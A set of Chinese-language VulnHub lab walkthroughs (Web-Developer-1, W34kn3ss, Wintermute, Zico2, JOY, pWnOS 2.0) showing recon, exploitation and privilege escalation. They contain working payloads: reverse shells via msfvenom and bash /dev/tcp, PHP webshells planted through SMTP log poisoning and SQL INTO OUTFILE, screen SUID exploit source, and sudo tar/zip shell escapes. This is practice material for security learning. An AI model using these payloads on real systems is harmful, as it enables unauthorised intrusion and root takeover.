<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.244 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.244 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Web-Developer-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口枚举</p>
<p><img src="/images/Web-Developer-1/2.png" alt="2"></p>
<p>发现了wordpress，这里坑了，后面我就对wordpress下手，可以用爆破枚举账户，但始终不能爆破出密码或漏洞扫描又没有发现可利用插件，浪费了一段时间</p>
<p>后来发现有个目录不在<code>directory-list-2.3-medium.txt</code>中，习惯使用这个，换个dirb的字典再扫一遍<br>选用dirb的big.txt</p>
<p><img src="/images/Web-Developer-1/3.png" alt="3"></p>
<p>我晕了，枚举必须做仔细了</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>ipdata目录下发现.cap包，wireshark分析</p>
<p><img src="/images/Web-Developer-1/4.png" alt="4"></p>
<p>仔细寻找，发现了POST数据包的wp登录请求，重中发现了凭证<code>webdeveloper/Te5eQg&amp;4sBS!Yr$)wf%(DcAd</code></p>
<p>直接修改插件</p>
<p><img src="/images/Web-Developer-1/5.png" alt="5"></p>
<p>位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.244&#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php</span><br></pre></td></tr></table></figure>

<p>这样我们就可以获取反弹shell了</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>枚举其他用户</p>
<p><img src="/images/Web-Developer-1/7.png" alt="7"></p>
<p>找到mysql连接文件</p>
<p><img src="/images/Web-Developer-1/6.png" alt="6"></p>
<p>用户名一致，尝试切换</p>
<p><img src="/images/Web-Developer-1/8.png" alt="8"></p>
<p>切换成功，sudo枚举</p>
<p><img src="/images/Web-Developer-1/9.png" alt="9"></p>
<p>发现tcpdump可以sudo执行</p>
<p>kali生成linux的reverse_shell木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p payload linux&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.201 LPORT&#x3D;8080 -f elf -o evil.elf</span><br></pre></td></tr></table></figure>

<p>传输到对方tmp目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z &#x2F;tmp&#x2F;evil.elf -Z root</span><br></pre></td></tr></table></figure>

<p><img src="/images/Web-Developer-1/10.png" alt="10"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场W34kn3ss 1</title>
    <url>/2020/09/22/%E9%9D%B6%E5%9C%BAW34kn3ss-1/</url>
    <content><![CDATA[<h1 id="W34kn3ss-1"><a href="#W34kn3ss-1" class="headerlink" title="W34kn3ss 1"></a>W34kn3ss 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.216</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.216 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.216 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/W34kn3ss-1/1.png" alt="1"></p>
<p>扫描发现了一个域名，添加到host里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.216	weakness.jth</span><br></pre></td></tr></table></figure>

<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问，发现了一个信息 n30</p>
<p><img src="/images/W34kn3ss-1/2.png" alt="2"></p>
<p>接着进行目录枚举</p>
<p><img src="/images/W34kn3ss-1/3.png" alt="3"></p>
<p>发现了文件夹private，但是private里没有更多的信息，尝试进行子目录枚举</p>
<p><img src="/images/W34kn3ss-1/4.png" alt="4"></p>
<p>这次终于有所发现</p>
<p>发现了公钥</p>
<p><img src="/images/W34kn3ss-1/5.png" alt="5"></p>
<p>提示了openssl的版本</p>
<p><img src="/images/W34kn3ss-1/6.png" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/W34kn3ss-1/7.png" alt="7"></p>
<p>这个漏洞原理就不细说了，已经受过一次很长时间的苦了</p>
<p>首先确认位数，并提取md5指纹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -l -f authorized_keys</span><br><span class="line">ssh-keygen -l -E md5 -f authorized_keys |sed &#39;s&#x2F;:&#x2F;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/W34kn3ss-1/8.png" alt="8"></p>
<p>知道是2048位，直接去<a href="https://github.com/g0tmi1k/debian-ssh%E4%B8%8B%E8%BD%BD2048%EF%BC%8C%E5%B9%B6%E8%A7%A3%E5%8E%8B">https://github.com/g0tmi1k/debian-ssh下载2048，并解压</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -jxf debian_ssh_rsa_2048_x86.tar.bz2</span><br></pre></td></tr></table></figure>

<p>接着进入该目录，搜索与该md5指纹公钥匹配的私钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . |grep 4161de56829de2fe64b9055711f531c1</span><br></pre></td></tr></table></figure>

<p>使用刚刚发现的用户名，配合私钥就可以连接上去了</p>
<p><img src="/images/W34kn3ss-1/9.png" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas扫描，啥都没发现，这种情况需要手动发现一些linpeas无法枚举到的位置，比如home目录</p>
<p><img src="/images/W34kn3ss-1/10.png" alt="10"></p>
<p>发现了code，是一个pyc文件，把它传输到kali进行反编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install uncompyle6</span><br><span class="line">uncompyle6 code.pyc</span><br></pre></td></tr></table></figure>

<p><img src="/images/W34kn3ss-1/11.png" alt="11"></p>
<p>发现了一个密码<code>dMASDNB!!#B!#!#33</code>，看到之前linpeas的sudo -l没有枚举出来，可能是该账户的密码</p>
<p><img src="/images/W34kn3ss-1/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Wintermute</title>
    <url>/2020/09/16/%E9%9D%B6%E5%9C%BAWintermute/</url>
    <content><![CDATA[<h1 id="Wintermute"><a href="#Wintermute" class="headerlink" title="Wintermute"></a>Wintermute</h1><p>kali:192.168.1.201<br>目标:192.168.1.245</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.245 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.245 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wintermute/1.png" alt="1"></p>
<p>有两个web服务80和3000</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问查看，80端口没什么东西，3000端口发现ntopng，但ntopng只找到XSS和CSRF漏洞</p>
<p>开始目录枚举</p>
<p>80端口</p>
<p><img src="/images/Wintermute/2png.png" alt="2png"></p>
<p>3000端口</p>
<p>真啥也没发现</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>ntopng发现了一个信息</p>
<p><img src="/images/Wintermute/3.png" alt="3"></p>
<p>直接提示了默认的登录凭据<code>admin/admin</code></p>
<p><img src="/images/Wintermute/4.png" alt="4"></p>
<p>在Flows下发现了<code>/turing-bolo/</code>和<code>/freeside/</code><br>其中<code>/freeside/</code>是之前枚举出的80端口目录，所以我们获得了另一个目录</p>
<p>访问它</p>
<p><img src="/images/Wintermute/5.png" alt="5"></p>
<p>点击query发现了一个这样的URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.245&#x2F;turing-bolo&#x2F;bolo.php?bolo&#x3D;riviera</span><br></pre></td></tr></table></figure>

<p>看来是个文件包含</p>
<p>尝试了之后，发现好像读不了，那只能看看页面提供的信息了<br>在一处发现了提示</p>
<p><img src="/images/Wintermute/7.png" alt="7"></p>
<p>这里比较有意思，看来这的确是一个LFI漏洞，不过末尾是.log，我们无法通过一些常规截断的方式处理</p>
<p>为了确认我们的猜测可以尝试包含一个<code>*.log</code>文件，linux中的.log文件<a href="https://www.cnblogs.com/fuyusong/p/7537798.html">https://www.cnblogs.com/fuyusong/p/7537798.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.245&#x2F;turing-bolo&#x2F;bolo.php?bolo&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;dpkg</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wintermute/8.png" alt="8"></p>
<p>成功使LFI成功</p>
<p>现在需要某个能输入的地方来污染某个.log的日志，且需要知道它的文件位置<br>想到之前还有个25端口没有使用</p>
<p>谷歌搜索<code>Postfix log location</code>可以找到<a href="https://askubuntu.com/questions/394724/where-are-the-postfix-log-files">https://askubuntu.com/questions/394724/where-are-the-postfix-log-files</a></p>
<p><img src="/images/Wintermute/9.png" alt="9"></p>
<p>尝试读取</p>
<p><img src="/images/Wintermute/10.png" alt="10"></p>
<p>读取成功，现在连接到smtp，尝试写入一些污染数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.1.245 25</span><br><span class="line">MAIL FROM: &quot;evil &lt;?php phpinfo(); system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><br><span class="line">RCPT TO: ROOT</span><br><span class="line">data						&#x2F;&#x2F;表示邮件内容</span><br><span class="line">evil	</span><br><span class="line">.							&#x2F;&#x2F;表示内容结束</span><br></pre></td></tr></table></figure>

<p>再次访问</p>
<p><img src="/images/Wintermute/11.png" alt="11"></p>
<p>phpinfo成功，并且shell也应该写入了</p>
<p>直接反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;4444 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wintermute/12.png" alt="12"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权有点小复杂</p>
<p><img src="/images/Wintermute/13.png" alt="13"></p>
<p>发现SUID screen-4.5.0</p>
<p><img src="/images/Wintermute/14.png" alt="14"></p>
<p>找到了41154.sh，照着它的步骤做</p>
<ol>
<li>kali中创建两个文件</li>
</ol>
<p>libhax.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rootshell.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>传输到对方的tmp目录</li>
<li>编译</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o &#x2F;tmp&#x2F;libhax.so &#x2F;tmp&#x2F;libhax.c</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o &#x2F;tmp&#x2F;rootshell &#x2F;tmp&#x2F;rootshell.c</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>继续跟着文档走</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc</span><br><span class="line">umask 000</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">screen -ls</span><br><span class="line">&#x2F;tmp&#x2F;rootshell</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wintermute/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Zico2</title>
    <url>/2020/09/16/%E9%9D%B6%E5%9C%BAZico2/</url>
    <content><![CDATA[<h1 id="Zico2"><a href="#Zico2" class="headerlink" title="Zico2"></a>Zico2</h1><p>kali:192.168.1.201<br>目标:192.168.1.215</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.215 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.215 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/1.png" alt="1"></p>
<p>80端口是最好的下手目标</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>查看主页，这里主页的链接非常少，很快就可以检查完</p>
<p><img src="/images/Zico2/2.png" alt="2"></p>
<p>主页没有太多有用的信息，但是仔细检查发现一处连接存在问题<br>从提交的参数来看是一处LFI，尝试利用</p>
<p><img src="/images/Zico2/3.png" alt="3"></p>
<p>利用成功</p>
<p><img src="/images/Zico2/9.png" alt="9"></p>
<p>查看源代码更好的显示，发现了用户名zico</p>
<p>接着进行目录扫描</p>
<p><img src="/images/Zico2/4.png" alt="4"></p>
<p>dbadmin非常显眼</p>
<p><img src="/images/Zico2/5.png" alt="5"></p>
<p>进去是phpLiteAdmin</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试phpliteadmin弱口令登录，秘密admin成功登录</p>
<p><img src="/images/Zico2/6.png" alt="6"></p>
<p>该版本容易收到rce漏洞，但是先别急，目前已经存在了一个表，看看有什么信息</p>
<p><img src="/images/Zico2/7.png" alt="7"></p>
<p>获取两个账号和密码哈希，尝试破解</p>
<p><img src="/images/Zico2/8.png" alt="8"></p>
<p>直接尝试ssh登录</p>
<p><img src="/images/Zico2/10.png" alt="10"></p>
<p>竟然都登不上，那这组凭据暂时没有发挥的余地了</p>
<p>尝试24044.txt的RCE漏洞</p>
<p><img src="/images/Zico2/11.png" alt="11"></p>
<p>具体利用方式参考HTB:nineveh</p>
<p>找到我们的文件路径</p>
<p><img src="/images/Zico2/12.png" alt="12"></p>
<p>使用之前的LFI，即可获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.215&#x2F;view.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;databases&#x2F;evil</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1-脏牛"><a href="#方法1-脏牛" class="headerlink" title="方法1 脏牛"></a>方法1 脏牛</h3><p>40839.c</p>
<p><img src="/images/Zico2/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o exp -lcrypt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/15.png" alt="15"></p>
<p>有时候提权会卡在这，没关系，直接ssh过去就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh firefart@ip</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/16.png" alt="16"></p>
<h3 id="方法2-sudo"><a href="#方法2-sudo" class="headerlink" title="方法2 sudo"></a>方法2 sudo</h3><p>竟然是通过创建数据库getshell，那一定有数据库的连接密码<br>但这里有点坑， 我在/var/www下没找到</p>
<p>不过在home目录下的zico用户里发现了wordpress</p>
<p><img src="/images/Zico2/17.png" alt="17"></p>
<p>发现mysql密码</p>
<p><img src="/images/Zico2/18.png" alt="18"></p>
<p>这个密码能让我们切换到zico用户下</p>
<p><img src="/images/Zico2/19.png" alt="19"></p>
<p>发现sudo权限</p>
<p>tar</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;bin&#x2F;tar -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>zip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -u)</span><br><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;zip $TF &#x2F;etc&#x2F;hosts -T -TT &#39;sh #&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/20.png" alt="20"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场digitalworld.local: JOY</title>
    <url>/2020/05/27/%E9%9D%B6%E5%9C%BAdigitalworld-local-JOY/</url>
    <content><![CDATA[<h1 id="Digitalworld-local-JOY"><a href="#Digitalworld-local-JOY" class="headerlink" title="Digitalworld.local(JOY)"></a>Digitalworld.local(JOY)</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.231</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/joy/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp枚举</p>
<p>发现两个目录download和upload</p>
<p><img src="/images/joy/2.jpg" alt="2"></p>
<p>在upload中，名为directory的文件发现了有趣的信息</p>
<p><img src="/images/joy/3.jpg" alt="3"></p>
<p>看上去是用户<code>Patrick</code>的目录，其中有一个名为version_control的文件看上去很可疑</p>
<h4 id="ProFTPD任意文件读取-CVE-2015-3306"><a href="#ProFTPD任意文件读取-CVE-2015-3306" class="headerlink" title="ProFTPD任意文件读取(CVE-2015-3306)"></a>ProFTPD任意文件读取(CVE-2015-3306)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.1.231 21</span><br><span class="line">site cpfr &#x2F;home&#x2F;patrick&#x2F;version_control			&#x2F;&#x2F;复制</span><br><span class="line">site cpto &#x2F;home&#x2F;ftp&#x2F;upload&#x2F;version_control		&#x2F;&#x2F;粘贴</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p><img src="/images/joy/4.jpg" alt="4"></p>
<p>之后就可以查看version_control了<br>不过这里有点费解<code>/home/ftp/upload/</code>这个目录是如何得到的</p>
<h4 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h4><p>使用nmap进行了一次UDP扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn -A -sU -T4 -oN &#x2F;root&#x2F;Desktop&#x2F;UDPscan.tx 192.168.1.231</span><br></pre></td></tr></table></figure>

<p>发现161端口SNMP显示tftp工作于36969端口，侦听的目录是<code>/home/patrick</code></p>
<p><img src="/images/joy/5.jpg" alt="5"></p>
<p>之后使用tftp就可以下载该目录的文件了</p>
<p><img src="/images/joy/6.jpg" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h4 id="ProFTPD-mod-copy-CVE-2019-12815"><a href="#ProFTPD-mod-copy-CVE-2019-12815" class="headerlink" title="ProFTPD_mod_copy(CVE-2019-12815)"></a>ProFTPD_mod_copy(CVE-2019-12815)</h4><p><img src="/images/joy/7.jpg" alt="7"></p>
<p>获取交互</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/joy/8.jpg" alt="8"></p>
<p>在改目录下发现了账号和密码<code>patrick:apollo098765</code></p>
<p>切换用户后，发现可以免密执行的文件</p>
<p><img src="/images/joy/9.jpg" alt="9"></p>
<p>上传本地提权文件</p>
<p><img src="/images/joy/10.jpg" alt="10"></p>
<p>路径移动</p>
<p><img src="/images/joy/11.jpg" alt="11"></p>
<p>执行提权文件即可</p>
<p><img src="/images/joy/12.jpg" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场pWnOS 2.0</title>
    <url>/2020/09/14/%E9%9D%B6%E5%9C%BApWnOS-2-0/</url>
    <content><![CDATA[<h1 id="pWnOS2-0"><a href="#pWnOS2-0" class="headerlink" title="pWnOS2.0"></a>pWnOS2.0</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.202</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.201 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.201 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>对http服务进行枚举</p>
<p>nikto扫描</p>
<p><img src="/images/pWnOS2.0/2.png" alt="2"></p>
<p>目录枚举</p>
<p><img src="/images/pWnOS2.0/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>手动检查页面能发现很多有价值的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login.php		 一个登录页面</span><br><span class="line">info.php		 phpinfo信息</span><br><span class="line">blog&#x2F;			 Powered by Simple PHP Blog 0.4.0</span><br></pre></td></tr></table></figure>

<h3 id="方法1-sql注入"><a href="#方法1-sql注入" class="headerlink" title="方法1 sql注入"></a>方法1 sql注入</h3><p>在login.php处是一个登录页面，我可以尝试一些常见的sql注入命令</p>
<p>比如用户名1’，密码1’</p>
<p><img src="/images/pWnOS2.0/4.png" alt="4"></p>
<p>直接连查询语句都出来了，接下来就可以针对这块来下手<br>这里注意，sql注入的触发需要<strong>用户名和密码</strong>都提交参数才行</p>
<h4 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h4><p><strong>确认字段数</strong></p>
<p>字段数为9会报错，尝试8成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 9#</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/5.png" alt="5"></p>
<p>得到字段数为8</p>
<p><strong>确认回显字段</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,4,5,6,7,8#</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/6.png" alt="6"></p>
<p>第4个字段回显</p>
<p>接下来就是常规操作</p>
<p><strong>爆库</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,database(),5,6,7,8#			</span><br></pre></td></tr></table></figure>

<p>ch16</p>
<p><strong>爆表</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;ch16&quot; limit 0,1),5,6,7,8# </span><br></pre></td></tr></table></figure>

<p>只有一张表users</p>
<p><strong>爆字段</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,(select column_name from information_schema.columns where table_schema&#x3D;&#39;ch16&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),5,6,7,8#</span><br></pre></td></tr></table></figure>

<p>关键的是email和pass</p>
<p><strong>爆数据</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,(select email from users limit 0,1),5,6,7,8#</span><br><span class="line">1&#39; union select 1,2,3,(select pass from users limit 0,1),5,6,7,8#</span><br></pre></td></tr></table></figure>

<p>得到<a href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#x69;&#115;&#105;&#110;&#116;&#x73;&#46;&#99;&#x6f;&#x6d;">&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#x69;&#115;&#105;&#110;&#116;&#x73;&#46;&#99;&#x6f;&#x6d;</a>和c2c4b4e51d9e23c02c15702c136c3e950ba9a4af<br>这个sha1比较难破解，john跑了rockyou没有破解，这里可以用somd5.com破解</p>
<p>得到killerbeesareflying</p>
<p>但是这个凭据仍然无法登录</p>
<p><img src="/images/pWnOS2.0/7.png" alt="7"></p>
<p>但这不表示是一个兔子洞，我们可以尝试其他方法，比如之前的引发错误的语句，发现了web的目录</p>
<p><img src="/images/pWnOS2.0/8.png" alt="8"></p>
<p>我们可以直接尝试写webshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;,2,3,4,5,6,7,8 into outfile &#39;&#x2F;var&#x2F;www&#x2F;evil.php&#39;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/9.png" alt="9"></p>
<p>这样我们就可以拿到shell了</p>
<p>补充另外的注入方式</p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select updatexml(1,concat(0x7e,version(),0x7e),1)#</span><br><span class="line">1&#39; union select updatexml(1,concat(0x7e,(select+pass+from+users+limit+0,1),0x7e),1)#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select count(*),1,1,1,1,1,1,(concat(floor(rand(0)*2),&#39;@&#39;,(select version())))x from mysql.user group by x#</span><br></pre></td></tr></table></figure>

<p>布尔盲注和时间盲注不演示了，这里也可以，但太麻烦</p>
